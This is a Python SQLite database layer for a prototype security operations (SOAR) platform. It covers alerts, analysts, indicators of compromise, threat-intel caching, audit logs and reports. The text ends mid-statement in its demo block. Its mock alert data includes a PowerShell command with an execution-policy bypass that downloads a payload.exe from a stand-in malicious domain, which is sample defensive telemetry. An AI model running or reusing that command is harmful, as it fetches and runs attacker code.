import sqlite3
from pathlib import Path
from datetime import datetime, timedelta


class Database:
    """
    SQLite database access layer for the SOC SOAR platform.

    Responsibilities:
    - Open SQLite connections
    - Initialize the database schema
    - Execute database operations
    - Manage analysts
    - Manage alerts
    """

    def __init__(self, db_path=None, schema_path=None):
        """
        Set database and schema file locations.
        """

        base_dir = Path(__file__).resolve().parent

        self.db_path = (
            Path(db_path)
            if db_path
            else base_dir / "soar.db"
        )

        self.schema_path = (
            Path(schema_path)
            if schema_path
            else base_dir / "schema.sql"
        )

    # ========================================================
    # CONNECTION
    # ========================================================

    def connect(self):
        """
        Create and return a SQLite connection.
        """

        connection = sqlite3.connect(self.db_path)

        # Allows rows to be accessed by column name.
        connection.row_factory = sqlite3.Row

        # Enable foreign-key enforcement.
        connection.execute(
            "PRAGMA foreign_keys = ON"
        )

        return connection

    # ========================================================
    # DATABASE INITIALIZATION
    # ========================================================

    def initialize(self):
        """
        Create database tables using schema.sql.
        """

        if not self.schema_path.exists():
            raise FileNotFoundError(
                f"Schema file not found: {self.schema_path}"
            )

        schema = self.schema_path.read_text(
            encoding="utf-8"
        )

        connection = self.connect()

        try:
            connection.executescript(schema)

        finally:
            connection.close()

    # ========================================================
    # GENERIC WRITE OPERATION
    # ========================================================

    def execute(self, query, parameters=()):
        """
        Execute INSERT, UPDATE, or DELETE.

        Returns:
            int: last inserted row ID
        """

        connection = self.connect()

        try:
            cursor = connection.execute(
                query,
                parameters
            )

            connection.commit()

            return cursor.lastrowid

        except Exception:
            connection.rollback()
            raise

        finally:
            connection.close()

    # ========================================================
    # GENERIC READ OPERATIONS
    # ========================================================

    def fetch_one(self, query, parameters=()):
        """
        Execute a SELECT query and return one row.
        """

        connection = self.connect()

        try:
            cursor = connection.execute(
                query,
                parameters
            )

            return cursor.fetchone()

        finally:
            connection.close()

    def fetch_all(self, query, parameters=()):
        """
        Execute a SELECT query and return all rows.
        """

        connection = self.connect()

        try:
            cursor = connection.execute(
                query,
                parameters
            )

            return cursor.fetchall()

        finally:
            connection.close()

    # ========================================================
    # ANALYST OPERATIONS
    # ========================================================

    def add_analyst(
        self,
        username,
        availability="Away / Offline"
    ):
        """
        Create a new analyst.

        Returns:
            int: newly created analyst ID
        """

        query = """
            INSERT INTO analysts (
                username,
                availability
            )
            VALUES (?, ?)
        """

        return self.execute(
            query,
            (username, availability)
        )

    def get_analyst_by_username(self, username):
        """
        Find an analyst by username.

        Returns:
            sqlite3.Row | None
        """

        query = """
            SELECT
                id,
                username,
                availability,
                created_at
            FROM analysts
            WHERE username = ?
        """

        return self.fetch_one(
            query,
            (username,)
        )

    def get_all_analysts(self):
        """
        Return all analysts.
        """

        query = """
            SELECT
                id,
                username,
                availability,
                created_at
            FROM analysts
            ORDER BY username
        """

        return self.fetch_all(query)

    def update_analyst_availability(
        self,
        username,
        availability
    ):
        """
        Update analyst availability.

        Returns:
            int: number of updated rows
        """

        query = """
            UPDATE analysts
            SET availability = ?
            WHERE username = ?
        """

        connection = self.connect()

        try:
            cursor = connection.execute(
                query,
                (availability, username)
            )

            connection.commit()

            return cursor.rowcount

        except Exception:
            connection.rollback()
            raise

        finally:
            connection.close()

    def seed_default_analysts(self):
        """
        Insert the initial analysts used by the prototype.

        Safe to execute multiple times.
        """

        analysts = [
            ("Analyst 01", "Available"),
            ("Analyst 02", "Away / Offline"),
            ("Analyst 03", "Available"),
        ]

        query = """
            INSERT OR IGNORE INTO analysts (
                username,
                availability
            )
            VALUES (?, ?)
        """

        connection = self.connect()

        try:
            connection.executemany(
                query,
                analysts
            )

            connection.commit()

        except Exception:
            connection.rollback()
            raise

        finally:
            connection.close()

    # ========================================================
    # ALERT OPERATIONS
    # ========================================================

    def add_alert(
        self,
        alert_id,
        source,
        rule_id,
        rule_desc,
        severity,
        state="NEW",
        assigned_to=None,
        source_event_id=None,
        source_severity=None,
        event_timestamp=None,
        src_ip=None,
        dst_ip=None,
        service=None,
        action=None,
        agent=None,
        raw_event=None
    ):
        """
        Create a new alert.

        assigned_to should contain an analyst database ID
        or None when the alert is unassigned.

        Returns:
            str: alert ID
        """

        query = """
            INSERT INTO alerts (
                id,
                source,
                source_event_id,
                rule_id,
                rule_desc,
                source_severity,
                severity,
                state,
                assigned_to,
                src_ip,
                dst_ip,
                service,
                action,
                agent,
                raw_event,
                event_timestamp
            )
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """
        
        self.execute(
            query,
            (
                alert_id,
                source,
                source_event_id,
                rule_id,
                rule_desc,
                source_severity,
                severity,
                state,
                assigned_to,
                src_ip,
                dst_ip,
                service,
                action,
                agent,
                raw_event,
                event_timestamp
            )
        )

        return alert_id

    def get_alert(self, alert_id):
        """
        Get one alert, including the assigned analyst username.
        """

        query = """
            SELECT
                a.id,
                a.source,
                a.source_event_id,
                a.rule_id,
                a.rule_desc,
                a.source_severity,
                a.severity,
                a.state,
                a.assigned_to,
                analysts.username AS assigned_username,
                a.src_ip,
                a.dst_ip,
                a.service,
                a.action,
                a.agent,
                a.raw_event,
                a.event_timestamp,
                a.disposition,
                a.created_at,
                a.updated_at

            FROM alerts AS a

            LEFT JOIN analysts
                ON a.assigned_to = analysts.id

            WHERE a.id = ?
        """

        return self.fetch_one(
            query,
            (alert_id,)
        )

    def get_alert_by_source_event_id(
        self,
        source,
        source_event_id
    ):
        """
        Retrieve an alert using its external source event ID.
    
        Used by ingestion logic to detect duplicate events.
        """
    
        query = """
            SELECT
                a.id,
                a.source,
                a.source_event_id,
                a.rule_id,
                a.rule_desc,
                a.source_severity,
                a.severity,
                a.state,
                a.assigned_to,
                analysts.username AS assigned_username,
                a.src_ip,
                a.dst_ip,
                a.service,
                a.action,
                a.agent,
                a.raw_event,
                a.event_timestamp,
                a.disposition,
                a.created_at,
                a.updated_at
    
            FROM alerts AS a
    
            LEFT JOIN analysts
                ON a.assigned_to = analysts.id
    
            WHERE
                a.source = ?
                AND a.source_event_id = ?
    
            LIMIT 1
        """
    
        return self.fetch_one(
            query,
            (
                source,
                source_event_id
            )
        )
    
    def get_alert_queue(self):
        """
        Return lightweight alert records for queue rendering.

        The raw Wazuh event payload is intentionally excluded. It is loaded
        only when an analyst opens a specific alert in the investigation
        workspace.
        """

        query = """
            SELECT
                a.id,
                a.source,
                a.source_event_id,
                a.rule_id,
                a.rule_desc,
                a.source_severity,
                a.severity,
                a.state,
                a.assigned_to,
                analysts.username AS assigned_username,
                a.src_ip,
                a.dst_ip,
                a.service,
                a.action,
                a.agent,
                a.event_timestamp,
                a.disposition,
                a.created_at,
                a.updated_at

            FROM alerts AS a

            LEFT JOIN analysts
                ON a.assigned_to = analysts.id

            ORDER BY
                a.created_at DESC,
                a.rowid DESC
        """

        return self.fetch_all(query)

    def get_alert_count(self):
        """
        Return the total number of stored alerts.
        """

        row = self.fetch_one(
            "SELECT COUNT(*) AS total FROM alerts"
        )

        return int(row["total"])


    def get_all_alerts(self):
        """
        Return all alerts with assigned analyst information.
        """

        query = """
            SELECT
                a.id,
                a.source,
                a.source_event_id,
                a.rule_id,
                a.rule_desc,
                a.source_severity,
                a.severity,
                a.state,
                a.assigned_to,
                analysts.username AS assigned_username,
                a.src_ip,
                a.dst_ip,
                a.service,
                a.action,
                a.agent,
                a.raw_event,
                a.event_timestamp,
                a.disposition,
                a.created_at,
                a.updated_at

            FROM alerts AS a

            LEFT JOIN analysts
                ON a.assigned_to = analysts.id

            ORDER BY
                a.created_at DESC,
                a.rowid DESC
        """

        return self.fetch_all(query)

    def assign_alert(self, alert_id, analyst_id):
        """
        Assign an unassigned NEW alert to an analyst.

        An alert cannot be claimed if it is already assigned.

        Returns:
            int: number of updated rows
        """

        query = """
            UPDATE alerts

            SET
                assigned_to = ?,
                state = 'ASSIGNED',
                updated_at = CURRENT_TIMESTAMP

            WHERE
                id = ?
                AND assigned_to IS NULL
                AND state = 'NEW'
        """

        connection = self.connect()

        try:
            cursor = connection.execute(
                query,
                (analyst_id, alert_id)
            )

            connection.commit()

            return cursor.rowcount

        except Exception:
            connection.rollback()
            raise

        finally:
            connection.close()

    def update_alert_state(
        self,
        alert_id,
        new_state
    ):
        """
        Update an alert workflow state.

        Returns:
            int: number of updated rows
        """

        valid_states = {
            "NEW",
            "ASSIGNED",
            "INVESTIGATING",
            "CLOSED",
            "ESCALATED"
        }

        if new_state not in valid_states:
            raise ValueError(
                f"Invalid alert state: {new_state}"
            )

        query = """
            UPDATE alerts

            SET
                state = ?,
                updated_at = CURRENT_TIMESTAMP

            WHERE id = ?
        """

        connection = self.connect()

        try:
            cursor = connection.execute(
                query,
                (new_state, alert_id)
            )

            connection.commit()

            return cursor.rowcount

        except Exception:
            connection.rollback()
            raise

        finally:
            connection.close()

    def update_alert_disposition(
        self,
        alert_id,
        disposition
    ):
        """
        Save the final disposition of an alert.

        Examples:
        - True Positive
        - False Positive
        - Benign
        - Duplicate
        - Other

        Returns:
            int: number of updated rows
        """

        valid_dispositions = {
            "True Positive",
            "False Positive",
            "Benign",
            "Duplicate",
            "Other"
        }

        if disposition not in valid_dispositions:
            raise ValueError(
                f"Invalid alert disposition: {disposition}"
            )

        query = """
            UPDATE alerts

            SET
                disposition = ?,
                updated_at = CURRENT_TIMESTAMP

            WHERE id = ?
        """

        connection = self.connect()

        try:

            cursor = connection.execute(
                query,
                (
                    disposition,
                    alert_id
                )
            )

            connection.commit()

            return cursor.rowcount

        except Exception:

            connection.rollback()
            raise

        finally:

            connection.close()

    # ========================================================
    # INVESTIGATION OPERATIONS
    # ========================================================

    def create_investigation(self, alert_id):
        """
        Create an investigation workspace for an alert.

        Because alert_id is UNIQUE in the investigations table,
        an alert can only have one investigation workspace.

        INSERT OR IGNORE makes this safe to call repeatedly.

        Returns:
            int: newly inserted investigation ID,
                 or 0 if it already existed.
        """

        query = """
            INSERT OR IGNORE INTO investigations (
                alert_id
            )
            VALUES (?)
        """

        return self.execute(
            query,
            (alert_id,)
        )

    def get_investigation(self, alert_id):
        """
        Retrieve the investigation workspace for an alert.

        Returns:
            sqlite3.Row | None
        """

        query = """
            SELECT
                id,
                alert_id,
                notes,
                findings,
                evidence,
                created_at,
                updated_at

            FROM investigations

            WHERE alert_id = ?
        """

        return self.fetch_one(
            query,
            (alert_id,)
        )

    def save_investigation(
        self,
        alert_id,
        notes,
        findings,
        evidence
    ):
        """
        Create or update an investigation workspace.

        The operation is performed as a transaction so that
        the workspace remains consistent.

        Returns:
            int: number of updated rows
        """

        connection = self.connect()

        try:

            # ------------------------------------------------
            # Make sure the investigation exists.
            # ------------------------------------------------

            connection.execute(
                """
                INSERT OR IGNORE INTO investigations (
                    alert_id
                )
                VALUES (?)
                """,
                (alert_id,)
            )

            # ------------------------------------------------
            # Update the workspace.
            # ------------------------------------------------

            cursor = connection.execute(
                """
                UPDATE investigations

                SET
                    notes = ?,
                    findings = ?,
                    evidence = ?,
                    updated_at = CURRENT_TIMESTAMP

                WHERE alert_id = ?
                """,
                (
                    notes,
                    findings,
                    evidence,
                    alert_id
                )
            )

            connection.commit()

            return cursor.rowcount

        except Exception:

            connection.rollback()
            raise

        finally:

            connection.close()

    def delete_investigation(self, alert_id):
        """
        Delete an investigation workspace.

        This method is included for database completeness,
        but the SOAR application should normally not use it.
        Investigation history should generally be preserved.
        """

        query = """
            DELETE FROM investigations
            WHERE alert_id = ?
        """

        connection = self.connect()

        try:

            cursor = connection.execute(
                query,
                (alert_id,)
            )

            connection.commit()

            return cursor.rowcount

        except Exception:

            connection.rollback()
            raise

        finally:

            connection.close()

    # ========================================================
    # IOC OPERATIONS
    # ========================================================

    def add_ioc(self, value, ioc_type):
        """
        Add an IOC to the database if it does not already exist.

        IOC value is globally unique.

        Returns:
            int: IOC database ID
        """

        query = """
            INSERT OR IGNORE INTO iocs (
                value,
                type
            )
            VALUES (?, ?)
        """

        self.execute(
            query,
            (value, ioc_type)
        )

        ioc = self.get_ioc_by_value(value)

        if ioc is None:
            raise RuntimeError(
                f"Failed to create or retrieve IOC: {value}"
            )

        return ioc["id"]

    def get_ioc_by_value(self, value):
        """
        Retrieve one IOC by its value.
        """

        query = """
            SELECT
                id,
                value,
                type,
                created_at,
                updated_at

            FROM iocs

            WHERE value = ?
        """

        return self.fetch_one(
            query,
            (value,)
        )

    def get_ioc_by_id(self, ioc_id):
        """
        Retrieve one IOC by database ID.
        """

        query = """
            SELECT
                id,
                value,
                type,
                created_at,
                updated_at

            FROM iocs

            WHERE id = ?
        """

        return self.fetch_one(
            query,
            (ioc_id,)
        )

    def get_all_iocs(self):
        """
        Return all IOCs.
        """

        query = """
            SELECT
                id,
                value,
                type,
                created_at,
                updated_at

            FROM iocs

            ORDER BY value
        """

        return self.fetch_all(query)

    def link_ioc_to_alert(self, alert_id, ioc_id):
        """
        Create an Alert <-> IOC relationship.

        The same IOC can appear in multiple alerts.
        The same IOC cannot be linked twice to the same alert.

        Returns:
            int: 1 if a new relationship was created,
                 0 if the relationship already existed.
        """

        query = """
            INSERT OR IGNORE INTO alert_iocs (
                alert_id,
                ioc_id
            )
            VALUES (?, ?)
        """

        connection = self.connect()

        try:

            cursor = connection.execute(
                query,
                (alert_id, ioc_id)
            )

            connection.commit()

            return cursor.rowcount

        except Exception:

            connection.rollback()
            raise

        finally:

            connection.close()

    def get_alert_iocs(self, alert_id):
        """
        Return all IOCs associated with an alert.

        Includes IOC type and cached intelligence status.
        """

        query = """
            SELECT
                i.id,
                i.value,
                i.type,

                ii.status AS intelligence_status,
                ii.reputation,
                ii.source,
                ii.score,
                ii.first_seen,
                ii.last_checked

            FROM alert_iocs AS ai

            INNER JOIN iocs AS i
                ON ai.ioc_id = i.id

            LEFT JOIN ioc_intelligence AS ii
                ON i.id = ii.ioc_id

            WHERE ai.alert_id = ?

            ORDER BY i.value
        """

        return self.fetch_all(
            query,
            (alert_id,)
        )

    # ========================================================
    # IOC INTELLIGENCE OPERATIONS
    # ========================================================

    def save_ioc_intelligence(
        self,
        ioc_id,
        status,
        reputation=None,
        source=None,
        score=None,
        first_seen=None,
        last_checked=None,
        raw_data=None
    ):
        """
        Create or update cached intelligence for an IOC.

        Because ioc_id is UNIQUE in ioc_intelligence,
        each IOC has one current cached intelligence record.

        Returns:
            int: intelligence record ID
        """

        valid_statuses = {
            "Unknown",
            "Requested",
            "Cached Intelligence Available",
            "Failed"
        }

        if status not in valid_statuses:
            raise ValueError(
                f"Invalid IOC intelligence status: {status}"
            )

        query = """
            INSERT INTO ioc_intelligence (
                ioc_id,
                status,
                reputation,
                source,
                score,
                first_seen,
                last_checked,
                raw_data
            )
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)

            ON CONFLICT(ioc_id)
            DO UPDATE SET
                status = excluded.status,
                reputation = excluded.reputation,
                source = excluded.source,
                score = excluded.score,
                first_seen = excluded.first_seen,
                last_checked = excluded.last_checked,
                raw_data = excluded.raw_data
        """

        return self.execute(
            query,
            (
                ioc_id,
                status,
                reputation,
                source,
                score,
                first_seen,
                last_checked,
                raw_data
            )
        )

    def get_ioc_intelligence(self, ioc_id):
        """
        Retrieve cached intelligence for an IOC.

        Returns:
            sqlite3.Row | None
        """

        query = """
            SELECT
                ii.id,
                ii.ioc_id,
                i.value AS ioc_value,
                i.type,
                ii.status,
                ii.reputation,
                ii.source,
                ii.score,
                ii.first_seen,
                ii.last_checked,
                ii.raw_data

            FROM ioc_intelligence AS ii

            INNER JOIN iocs AS i
                ON ii.ioc_id = i.id

            WHERE ii.ioc_id = ?
        """

        return self.fetch_one(
            query,
            (ioc_id,)
        )

    # ========================================================
    # AUDIT LOG OPERATIONS
    # ========================================================

    def add_audit_event(
        self,
        action,
        analyst_id=None,
        alert_id=None,
        details=None
    ):
        """
        Add one event to the audit log.

        Audit events record operational actions such as:
        - Alert Assigned
        - Investigation Started
        - Workspace Updated
        - Enrichment Requested
        - Enrichment Completed
        - Alert Closed
        - Alert Escalated

        Returns:
            int: newly created audit event ID
        """

        query = """
            INSERT INTO audit_log (
                analyst_id,
                action,
                alert_id,
                details
            )
            VALUES (?, ?, ?, ?)
        """

        return self.execute(
            query,
            (
                analyst_id,
                action,
                alert_id,
                details
            )
        )

    def get_audit_event(self, audit_id):
        """
        Retrieve one audit event.

        Includes the analyst username when available.
        """

        query = """
            SELECT
                al.id,
                al.timestamp,
                al.analyst_id,
                a.username AS analyst_username,
                al.action,
                al.alert_id,
                al.details

            FROM audit_log AS al

            LEFT JOIN analysts AS a
                ON al.analyst_id = a.id

            WHERE al.id = ?
        """

        return self.fetch_one(
            query,
            (audit_id,)
        )

    def get_audit_log(
        self,
        alert_id=None,
        analyst_id=None
    ):
        """
        Retrieve audit events.

        Optional filters:
        - alert_id
        - analyst_id

        Results are returned newest first.
        """

        query = """
            SELECT
                al.id,
                al.timestamp,
                al.analyst_id,
                a.username AS analyst_username,
                al.action,
                al.alert_id,
                al.details

            FROM audit_log AS al

            LEFT JOIN analysts AS a
                ON al.analyst_id = a.id

            WHERE 1 = 1
        """

        parameters = []

        if alert_id is not None:
            query += """
                AND al.alert_id = ?
            """
            parameters.append(alert_id)

        if analyst_id is not None:
            query += """
                AND al.analyst_id = ?
            """
            parameters.append(analyst_id)

        query += """
            ORDER BY al.timestamp DESC, al.id DESC
        """

        return self.fetch_all(
            query,
            tuple(parameters)
        )

    # ========================================================
    # REPORT OPERATIONS
    # ========================================================

    def add_report(
        self,
        report_id,
        alert_id,
        analyst_id,
        severity,
        status,
        summary,
        evidence,
        findings,
        recommendation
    ):
        """
        Create an investigation/escalation report.

        report_id is generated by the application/service layer.
        """

        query = """
            INSERT INTO reports (
                id,
                alert_id,
                analyst_id,
                severity,
                status,
                summary,
                evidence,
                findings,
                recommendation
            )
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        """

        return self.execute(
            query,
            (
                report_id,
                alert_id,
                analyst_id,
                severity,
                status,
                summary,
                evidence,
                findings,
                recommendation
            )
        )

    def get_report(self, report_id):
        """
        Retrieve one report.

        Includes:
        - Analyst username
        - Alert information
        """

        query = """
            SELECT
                r.id,
                r.alert_id,
                r.analyst_id,
                a.username AS analyst_username,
                r.severity,
                r.status,
                r.summary,
                r.evidence,
                r.findings,
                r.recommendation,
                r.created_at,
                r.updated_at

            FROM reports AS r

            INNER JOIN analysts AS a
                ON r.analyst_id = a.id

            WHERE r.id = ?
        """

        return self.fetch_one(
            query,
            (report_id,)
        )

    def get_reports(
        self,
        alert_id=None,
        analyst_id=None
    ):
        """
        Retrieve reports.

        Optional filters:
        - alert_id
        - analyst_id
        """

        query = """
            SELECT
                r.id,
                r.alert_id,
                r.analyst_id,
                a.username AS analyst_username,
                r.severity,
                r.status,
                r.summary,
                r.evidence,
                r.findings,
                r.recommendation,
                r.created_at,
                r.updated_at

            FROM reports AS r

            INNER JOIN analysts AS a
                ON r.analyst_id = a.id

            WHERE 1 = 1
        """

        parameters = []

        if alert_id is not None:
            query += """
                AND r.alert_id = ?
            """
            parameters.append(alert_id)

        if analyst_id is not None:
            query += """
                AND r.analyst_id = ?
            """
            parameters.append(analyst_id)

        query += """
            ORDER BY r.created_at DESC, r.id DESC
        """

        return self.fetch_all(
            query,
            tuple(parameters)
        )

    def update_report_status(
        self,
        report_id,
        status
    ):
        """
        Update the status of an existing report.
        """

        query = """
            UPDATE reports

            SET
                status = ?,
                updated_at = CURRENT_TIMESTAMP

            WHERE id = ?
        """

        connection = self.connect()

        try:

            cursor = connection.execute(
                query,
                (
                    status,
                    report_id
                )
            )

            connection.commit()

            return cursor.rowcount

        except Exception:

            connection.rollback()
            raise

        finally:

            connection.close()

    # ========================================================
    # ENRICHMENT REQUEST OPERATIONS
    # ========================================================

    def create_enrichment_request(
        self,
        ioc_id,
        alert_id,
        analyst_id
    ):
        """
        Create an enrichment request for an IOC.

        Behavior:
        - If cached intelligence already exists, no request is created.
        - If an active request already exists, return its ID.
        - Otherwise create a new request.

        Returns:
            int:
                New request ID
                Existing active request ID
                0 if cached intelligence already exists
        """

        # ----------------------------------------------------
        # 1. Check that the IOC exists.
        # ----------------------------------------------------

        ioc = self.get_ioc_by_id(ioc_id)

        if ioc is None:
            raise ValueError(
                f"IOC does not exist: {ioc_id}"
            )

        # ----------------------------------------------------
        # 2. Check existing intelligence.
        # ----------------------------------------------------

        intelligence = self.get_ioc_intelligence(
            ioc_id
        )

        if intelligence:
            if intelligence["status"] == (
                "Cached Intelligence Available"
            ):
                # No external lookup should be requested.
                return 0

        # ----------------------------------------------------
        # 3. Check for an already-active request.
        # ----------------------------------------------------

        existing_request = self.fetch_one(
            """
            SELECT
                id,
                status,
                requested_at
            FROM enrichment_requests
            WHERE
                ioc_id = ?
                AND status IN ('Requested', 'In Progress')
            ORDER BY id DESC
            LIMIT 1
            """,
            (ioc_id,)
        )

        if existing_request:
            return existing_request["id"]

        # ----------------------------------------------------
        # 4. Create a new request.
        # ----------------------------------------------------

        request_id = self.execute(
            """
            INSERT INTO enrichment_requests (
                ioc_id,
                alert_id,
                requested_by,
                status
            )
            VALUES (?, ?, ?, 'Requested')
            """,
            (
                ioc_id,
                alert_id,
                analyst_id
            )
        )

        # ----------------------------------------------------
        # 5. Reflect the request in IOC intelligence.
        #
        # The intelligence record tracks the IOC's state.
        # The request table tracks the operation itself.
        # ----------------------------------------------------

        self.save_ioc_intelligence(
            ioc_id,
            "Requested"
        )

        return request_id

    def get_enrichment_request(
        self,
        request_id
    ):
        """
        Retrieve one enrichment request.

        Includes:
        - IOC value
        - IOC type
        - Alert ID
        - Requesting analyst
        - Request status
        """

        query = """
            SELECT
                er.id,
                er.ioc_id,
                i.value AS ioc_value,
                i.type AS ioc_type,
                er.alert_id,
                er.requested_by,
                a.username AS requested_by_username,
                er.status,
                er.requested_at,
                er.completed_at

            FROM enrichment_requests AS er

            INNER JOIN iocs AS i
                ON er.ioc_id = i.id

            INNER JOIN analysts AS a
                ON er.requested_by = a.id

            WHERE er.id = ?
        """

        return self.fetch_one(
            query,
            (request_id,)
        )

    def get_enrichment_requests(
        self,
        ioc_id=None,
        alert_id=None
    ):
        """
        Retrieve enrichment requests.

        Optional filters:
        - ioc_id
        - alert_id
        """

        query = """
            SELECT
                er.id,
                er.ioc_id,
                i.value AS ioc_value,
                i.type AS ioc_type,
                er.alert_id,
                er.requested_by,
                a.username AS requested_by_username,
                er.status,
                er.requested_at,
                er.completed_at

            FROM enrichment_requests AS er

            INNER JOIN iocs AS i
                ON er.ioc_id = i.id

            INNER JOIN analysts AS a
                ON er.requested_by = a.id

            WHERE 1 = 1
        """

        parameters = []

        if ioc_id is not None:
            query += """
                AND er.ioc_id = ?
            """
            parameters.append(ioc_id)

        if alert_id is not None:
            query += """
                AND er.alert_id = ?
            """
            parameters.append(alert_id)

        query += """
            ORDER BY er.id DESC
        """

        return self.fetch_all(
            query,
            tuple(parameters)
        )

    def update_enrichment_request_status(
        self,
        request_id,
        new_status
    ):
        """
        Update the lifecycle status of an enrichment request.

        Valid statuses:
        - Requested
        - In Progress
        - Completed
        - Failed

        Returns:
            int: number of updated rows
        """

        valid_statuses = {
            "Requested",
            "In Progress",
            "Completed",
            "Failed"
        }

        if new_status not in valid_statuses:
            raise ValueError(
                f"Invalid enrichment request status: "
                f"{new_status}"
            )

        # ----------------------------------------------------
        # Determine whether this is a final state.
        # ----------------------------------------------------

        if new_status in {
            "Completed",
            "Failed"
        }:

            query = """
                UPDATE enrichment_requests

                SET
                    status = ?,
                    completed_at = CURRENT_TIMESTAMP

                WHERE id = ?
            """

        else:

            query = """
                UPDATE enrichment_requests

                SET
                    status = ?,
                    completed_at = NULL

                WHERE id = ?
            """

        connection = self.connect()

        try:

            cursor = connection.execute(
                query,
                (
                    new_status,
                    request_id
                )
            )

            connection.commit()

            return cursor.rowcount

        except Exception:

            connection.rollback()
            raise

        finally:

            connection.close()

    def seed_mock_iocs(self):
        """
        Create the IOC data currently represented by the GUI prototype.

        Safe to execute multiple times.
        """

        # ----------------------------------------------------
        # 1. Create IOC records
        # ----------------------------------------------------

        ioc_185 = self.add_ioc(
            "185.23.44.12",
            "IPv4"
        )

        ioc_10_0_0_5 = self.add_ioc(
            "10.0.0.5",
            "IPv4"
        )

        ioc_domain = self.add_ioc(
            "malicious.com",
            "Domain"
        )

        ioc_10_0_5_55 = self.add_ioc(
            "10.0.5.55",
            "IPv4"
        )

        # ----------------------------------------------------
        # 2. Link IOCs to alerts
        # ----------------------------------------------------

        self.link_ioc_to_alert(
            "ALT-1001",
            ioc_185
        )

        self.link_ioc_to_alert(
            "ALT-1001",
            ioc_10_0_0_5
        )

        self.link_ioc_to_alert(
            "ALT-1002",
            ioc_domain
        )

        self.link_ioc_to_alert(
            "ALT-1003",
            ioc_10_0_5_55
        )

        # ----------------------------------------------------
        # 3. Create cached intelligence
        # ----------------------------------------------------

        # Only seed intelligence for IOCs that have none yet.
        # initialize() runs on every launch; overwriting here
        # would erase real VirusTotal results and reset requests.
        def seed_intel(ioc_id, *args, **kwargs):
            if self.get_ioc_intelligence(ioc_id) is None:
                self.save_ioc_intelligence(ioc_id, *args, **kwargs)


        seed_intel(
            ioc_185,
            "Cached Intelligence Available",
            reputation="Malicious",
            source="VirusTotal",
            score="45/89",
            first_seen="2026-09-13 03:00:00",
            last_checked="2026-09-23 03:00:00"
        )

        seed_intel(
            ioc_domain,
            "Cached Intelligence Available",
            reputation="Suspicious",
            source="CrowdStrike",
            score="Medium",
            first_seen="2026-09-11 03:00:00",
            last_checked="2026-09-23 02:58:00"
        )

        seed_intel(
            ioc_10_0_0_5,
            "Unknown"
        )

        seed_intel(
            ioc_10_0_5_55,
            "Unknown"
        )

    # ========================================================
    # MOCK ALERT DATA
    # ========================================================

    def seed_mock_alerts(self):
        """
        Insert the three alerts currently used by the GUI prototype.

        Safe to execute multiple times.
        """

        analyst_01 = self.get_analyst_by_username(
            "Analyst 01"
        )

        analyst_02 = self.get_analyst_by_username(
            "Analyst 02"
        )

        if not analyst_01 or not analyst_02:
            raise RuntimeError(
                "Default analysts must exist before seeding alerts."
            )

        analyst_01_id = analyst_01["id"]
        analyst_02_id = analyst_02["id"]

        now = datetime.now()

        alerts = [

            {
                "id": "ALT-1001",
                "source": "Wazuh",
                "source_event_id": "W-5716-1001",
                "rule_id": "W-5716",
                "rule_desc": "SSHD brute force attempt",
                "severity": "CRITICAL",
                "state": "NEW",
                "assigned_to": None,
                "src_ip": "185.23.44.12",
                "dst_ip": "10.0.0.5",
                "service": "SSH",
                "action": "blocked",
                "agent": "linux-prod-01",
                "raw_event": (
                    "Oct 14 12:04:12 linux-prod-01 "
                    "sshd[1234]: Failed password for invalid "
                    "user admin from 185.23.44.12 "
                    "port 53212 ssh2"
                ),
            },

            {
                "id": "ALT-1002",
                "source": "Wazuh",
                "source_event_id": "W-3103-1002",
                "rule_id": "W-3103",
                "rule_desc": "Suspicious PowerShell Download",
                "severity": "HIGH",
                "state": "INVESTIGATING",
                "assigned_to": analyst_01_id,
                "src_ip": "10.0.0.22",
                "dst_ip": "142.250.190.46",
                "service": "HTTPS",
                "action": "allowed",
                "agent": "win-workstation-05",
                "raw_event": (
                    "powershell.exe "
                    "-ExecutionPolicy Bypass -c "
                    "\"Invoke-WebRequest -Uri "
                    "http://malicious.com/payload.exe\""
                ),
            },

            {
                "id": "ALT-1003",
                "source": "Wazuh",
                "source_event_id": "W-1002-1003",
                "rule_id": "W-1002",
                "rule_desc": (
                    "Successful Admin Login "
                    "outside business hours"
                ),
                "severity": "MEDIUM",
                "state": "ASSIGNED",
                "assigned_to": analyst_02_id,
                "src_ip": "10.0.5.55",
                "dst_ip": "10.0.0.10",
                "service": "RDP",
                "action": "success",
                "agent": "dc-server-01",
                "raw_event": (
                    "EventID 4624: An account was "
                    "successfully logged on."
                ),
            },
        ]

        query = """
            INSERT OR IGNORE INTO alerts (
                id,
                source,
                source_event_id,
                rule_id,
                rule_desc,
                severity,
                state,
                assigned_to,
                src_ip,
                dst_ip,
                service,
                action,
                agent,
                raw_event
            )
            VALUES (
                ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?
            )
        """

        connection = self.connect()

        try:
            for alert in alerts:

                connection.execute(
                    query,
                    (
                        alert["id"],
                        alert["source"],
                        alert["source_event_id"],
                        alert["rule_id"],
                        alert["rule_desc"],
                        alert["severity"],
                        alert["state"],
                        alert["assigned_to"],
                        alert["src_ip"],
                        alert["dst_ip"],
                        alert["service"],
                        alert["action"],
                        alert["agent"],
                        alert["raw_event"],
                    )
                )

            connection.commit()

        except Exception:
            connection.rollback()
            raise

        finally:
            connection.close()

    # ========================================================
    # DATABASE INFORMATION
    # ========================================================

    def get_tables(self):
        """
        Return all application tables.
        """

        query = """
            SELECT name
            FROM sqlite_master
            WHERE type = 'table'
            ORDER BY name
        """

        rows = self.fetch_all(query)

        return [
            row["name"]
            for row in rows
        ]


# ============================================================
# TEST / DEMONSTRATION
# ============================================================

if __name__ == "__main__":

    database = Database()

    # --------------------------------------------------------
    # 1. INITIALIZE DATABASE
    # --------------------------------------------------------

    database.initialize()

    # --------------------------------------------------------
    # 2. MAKE SURE REQUIRED DATA EXISTS
    # --------------------------------------------------------

    database.seed_default_analysts()
    database.seed_mock_alerts()
    database.seed_mock_iocs()

    print()
    print("==========================================")
    print("SOC SOAR AUDIT + REPORT DATABASE TEST")
    print("==========================================")

    # --------------------------------------------------------
    # 3. GET TEST ANALYST
    # --------------------------------------------------------

    analyst = database.get_analyst_by_username(
        "Analyst 01"
    )

    analyst_id = analyst["id"]

    print()
    print("Test analyst:")

    print(
        f"  {analyst['username']} "
        f"(ID {analyst_id})"
    )

    # --------------------------------------------------------
    # 4. CREATE AUDIT EVENT
    # --------------------------------------------------------

    print()
    print(
        "Creating audit event..."
